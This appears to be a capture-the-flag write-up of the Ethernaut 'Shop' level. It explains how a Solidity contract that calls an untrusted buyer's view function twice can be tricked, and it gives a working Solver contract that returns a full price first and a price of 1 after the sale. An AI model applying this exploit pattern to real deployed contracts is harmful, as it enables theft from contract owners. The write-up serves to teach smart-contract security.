![Shop](/assets/img/BigLevel21.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [References](#references)
   
# Challenge

The level states:

> Сan you get the item from the shop for less than the price asked?
> 
> ### **Things that might help:**
> 
> - `Shop` expects to be used from a `Buyer`
> - Understanding restrictions of view functions

And gives us the following contract's code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

# Solution

As usual, we start by analyzing the given contract's code. We see that this contract declares an interface of a contract with an external view function. Then, it implements a contract called `Shop`. This contract has two state variables called `price` and `isSold` which are an `uint` and a `bool` respectively. This contract also implements a public function called `buy()`. 

The `buy()` function first sets the caller as a Buyer (it should implement the price function specified in the interface). It then calls `Buyer.price()` and if the price is equal or greater than the `price` variable, and `isSold` is false, it sets `isSold` to true and sets the `price` variable with the value returned from a second call to `Buyer.price()`.

Note that the `Shop` contract is calling `price()` twice, one for comparing it with the "shop price" and a second one to save the actual "selling price". If we could manage to craft a contract that replies with 100 for the first call and with a value smaller than 100 on the subsequent call, we would be "buying" the item for less than the price asked by the shop. Which is what we need to do to crack this level.

And, how can we return two different values for two calls of the same function? Something similar to what we've done in the [level 11 - Elevator](/2023-07-14-ethernaut-11-elevator-writeup/). But this time, the price function needs to be declared as `view` as specified in the interface, what does this mean?

> Functions can be declared `view` in which case they promise not to modify the state.
> 
> The following statements are considered modifying the state:
> 1. Writing to state variables.
> 2. [Emitting events](https://docs.soliditylang.org/en/v0.8.15/contracts.html#events).
> 3. [Creating other contracts](https://docs.soliditylang.org/en/v0.8.15/control-structures.html#creating-contracts).
> 4. Using `selfdestruct`.
> 5. Sending Ether via calls.
> 6. Calling any function not marked `view` or `pure`.
> 7. Using low-level calls.
> 8. Using inline assembly that contains certain opcodes.

This means that we cannot modify any variable to know if `price()` was called or not... Then, we need to find another way to know if the call to `price()` is the first or the second one. Note that between the first and the second call, a state public variable of the `Shop` contract is updated. And that's `isSold`. And that's how we know if it's the first or the second call.

We need to create a contract that reads the `isSold` variable and returns 100 if it's false or a number smaller than 100 if it's true. Let's do that:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Shop.sol";

contract Solver is Buyer {
    Shop shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint) {
        if ( !shop.isSold()  ) {
            return 100;
        } else {
            return 1;
        }
    }

    function buy() public {
        shop.buy();
    }
}
```

Now we just need to deploy this contract with the `Shop` address as input and then call the function `buy()` from our `Solver` contract. We could verify if we succeeded by calling 

```javascript
await contract.price().then(v=>parseInt(v))
1
```

And that's all, we've passed this level! :)

![Well done](/assets/img/ethernaut_solved.png)

# References

- [View functions](https://docs.soliditylang.org/en/v0.8.15/contracts.html#view-functions)